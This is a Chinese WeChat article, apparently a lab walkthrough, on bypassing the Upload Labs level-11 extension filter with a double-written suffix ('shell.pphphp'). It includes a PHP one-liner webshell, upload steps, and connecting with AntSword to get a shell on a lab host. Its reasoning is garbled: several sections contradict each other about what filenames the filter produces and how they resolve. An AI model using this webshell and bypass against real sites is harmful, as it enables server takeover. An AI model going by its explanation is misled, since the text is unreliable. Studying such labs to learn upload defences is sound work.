---
title: Upload Labs 第11关：双写后缀绕过文件上传限制
url: https://mp.weixin.qq.com/s/PQj9RAmvvJL9No5vVwGz8Q
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:11:15.470880
---

# Upload Labs 第11关：双写后缀绕过文件上传限制

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5vTt22mqAAxzdxzptIibagOsBhuU7UDKaiayTSZK4b8X2EStLtQ7I0lyYbMvfSJE1Uk5BBTLHCpGWlnrLgTBpM3dEia7JYERUcblWeQPIBaekU/0?wx_fmt=jpeg)

# Upload Labs 第11关：双写后缀绕过文件上传限制

原创

武文学网安
武文学网安

武文学网安

![]()

在小说阅读器中沉浸阅读

大家好，我是武文。

在前面的关卡中，我们已经学习了多种绕过方式：

* 大小写绕过
* 点 / 空格绕过
* `$DATA`

  绕过
* 点空格点绕过

这些更多是**利用系统解析差异**。

但第11关开始，进入一个非常经典、也是实战中非常常见的漏洞：

```
字符串替换过滤绕过（双写后缀）
```

# 一、核心源码分析

第11关关键代码如下：

```
```
$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");$file_name = trim($_FILES['upload_file']['name']);$file_name = str_ireplace($deny_ext,"", $file_name);$temp_file = $_FILES['upload_file']['tmp_name'];$img_path = UPLOAD_PATH.'/'.$file_name;
```
```

---

# 二、这段代码在干什么？

逻辑其实很简单：

👉 **把文件名中的“危险字符串”全部删除**

例如：

```
shell.php → shell.
shell.jsp → shell.
```

开发者的想法是：

> “我把 php、jsp 都删掉，你就没法上传木马了。”

看起来很合理，但问题就出在：

```
str_ireplace()
```

---

# 三、漏洞核心：str\_ireplace 的“非递归替换”

函数：

```
str_ireplace($deny_ext,"",$file_name);
```

特点：

```
只对原始字符串进行一次整体替换
不会对替换后的结果再次检查
```

---

# 四、漏洞产生过程（关键！）

我们构造文件名：

```
shell.phpphp
```

---

## 第一步：原始输入

```
shell.phpphp
```

---

## 第二步：执行替换

```
str_ireplace("php","",$file_name);
```

替换过程：

```
shell.phpphp
↓ 删除 php
shell.
```

---

## 第三步：最终文件名

```
shell.
```

---

# 五、关键问题来了

Windows / Apache 在处理：

```
shell.
```

时，会自动解析为：

```
shell
```

但如果你构造稍微变化一下：

---

# 六、真正可利用 Payload

```
shell.php.php
```

替换过程：

```
shell.php.php
↓ 删除 php
shell..
```

最终：

```
shell.
→ shell
```

---

但这里还不够稳定。

---

# 七、最稳定利用方式（重点）

真正推荐的写法：

```
shell.pphphp
```

原因：

```
str_ireplace 是忽略大小写
但替换是按匹配顺序进行,pphphp—>php
```

---

# 八、最核心利用思路（总结一句话）

第11关的本质不是：

```
让 .php 直接存在
```

而是：

```
通过“拼接污染”，让过滤后重新生成 .php
```

---

# 九、实战操作

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAyhhsnibWgIA5slYwQiaCTou7P0tPz3xszYsXibZwb0JaW8xgnQicicdNDXtHFRm2gwqb3W7NBJGEklfdia4sriaZ7yPxxoMrTXvYnns0/640?wx_fmt=gif&from=appmsg)

---

## 1 准备一句话木马

```
<?php@eval($_POST['cmd']); ?>
```

---

## 2 将文件名命名为shell.pphphp

---

## 3 上传后服务器处理

```
shell.phpphp
↓ 过滤 php
shell.
↓ 系统解析
shell.php
```

最终生成：

```
shell.php
```

---

# 十、验证漏洞

访问：

```
http://192.168.243.128/uploadlabs/upload/shell.php
```

使用蚁剑连接：

```
密码：cmd
```

成功 getshell。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAx2NmWtS10WUtoDic7Kpib8hicQaogf7wo8hCML3X8GeGdPjE9l6Tj8yNJjw1etnyica7VtmibEoiaYogicS8icAiarPEYfzoCs1a49qErU/640?wx_fmt=gif&from=appmsg)

总结

这一关双写绕过其实和前面SQL注入中[双写关键词绕过](https://mp.weixin.qq.com/s?__biz=MzY0MDE4OTg4Mw==&mid=2247484423&idx=1&sn=ba635a8b91ac2e49ba7de91ec401b6c0&scene=21#wechat_redirect)的章节类似。本质都是开发者使用 `str_ireplace` 删除危险后缀，但由于字符串替换不会递归处理，攻击者可以通过“双写后缀”让过滤后重新生成 `.php`，从而绕过限制。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

武文学网安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VFf46TKXLVHNrxMtj4Y4Z6hGFDSYQ5Yu9VzwW1HJsVo4INnWEgrG57pkjsa8GN5zyNrbSAxgjYEzXVOtVWGcAQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过